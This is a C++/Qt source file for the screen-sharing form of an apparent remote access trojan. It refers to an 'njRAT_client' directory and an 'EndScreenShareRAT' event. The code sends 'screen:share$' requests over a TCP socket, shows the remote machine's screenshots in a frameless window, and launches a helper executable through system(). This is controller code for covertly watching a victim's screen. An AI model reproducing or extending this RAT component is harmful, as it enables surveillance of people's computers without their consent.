#include "screensharingform.h"
#include "ui_screensharingform.h"
#include <QApplication>
#include <QFile>
#include <QProcess>
#include <QPushButton>
#include <QThread>
#include <windows.h>

bool sharingPermission;

ScreenSharingForm::ScreenSharingForm(QWidget *parent) :
    QWidget(parent),
    ui(new Ui::ScreenSharingForm)
{
    ui->setupUi(this);

    functionalityForm = nullptr;

    setWindowTitle("Трансляция экрана");
    this->setWindowFlags(Qt::FramelessWindowHint);  // чтобы не было Windows bar'a

    ui->screenshotSharingLabel->setAlignment(Qt::AlignCenter);
    ui->screenshotSharingLabel->setStyleSheet("background-color: #22272c;"
                                              "color: #597387;"
                                              "font-size: 40px;");
}

ScreenSharingForm::~ScreenSharingForm()
{
    delete ui;
}

DWORD WINAPI threadFoo(LPVOID ptr)
{
    //QProcess* process = new QProcess((QObject*)ptr);
    //QString sysCom = QString("cmd.exe /C \"start D:/endProcess.exe\"");
    //QString sysCom = "cmd.exe /C \"" + QCoreApplication::applicationDirPath() + "/endProcess.exe\"";
    //process->start(sysCom);

    //QThread::sleep(3);

    //char signalName[] = "EndScreenShareRAT";
    //HANDLE signal = OpenEventA(EVENT_ALL_ACCESS, FALSE, signalName);
    //char acceptSignalName[] = "EndScreenShareAccept";
    //HANDLE acceptSignal = OpenEventA(EVENT_ALL_ACCESS, FALSE, acceptSignalName);

    //WaitForSingleObject(signal, INFINITE);
    //SetEvent(acceptSignal);

    system(('\"' + QCoreApplication::applicationDirPath() + "/../njRAT_client/endProcess.exe\"").toStdString().c_str());
    sharingPermission = false;
}

void ScreenSharingForm::get_functionalityForm(FunctionalityForm *mw, QTcpSocket *sk)
{
    functionalityForm = mw;
    socket = sk;
    sharingPermission = true;

    ui->screenshotSharingLabel->clear();
    ui->screenshotSharingLabel->setText("Wait the screen share...");

    CreateThread(NULL, NULL, threadFoo, this, NULL, NULL);

    sendQuery();
}

void ScreenSharingForm::sendQuery()
{
    if (sharingPermission)
    {
        if (socket->isOpen())
        {
            socket->write(QString("screen:share$").toStdString().c_str());
            socket->waitForBytesWritten(50);
        }
        else
        {
            functionalityForm->show();
            this->hide();
            QMessageBox::critical(this, "Error!", "Loss of connection to the server!");
        }
    }
    else
    {
        functionalityForm->show();
        this->hide();
    }
}

void ScreenSharingForm::get_screenshot_for_sharing(QPixmap *screenshot)
{
    int w = ui->screenshotSharingLabel->width();
    int h = ui->screenshotSharingLabel->height();
    ui->screenshotSharingLabel->clear();
    ui->screenshotSharingLabel->setPixmap(screenshot->scaled(w, h, Qt::KeepAspectRatio));  // Установка картинки
    ui->screenshotSharingLabel->setStyleSheet("background: none;");

    sendQuery();
}
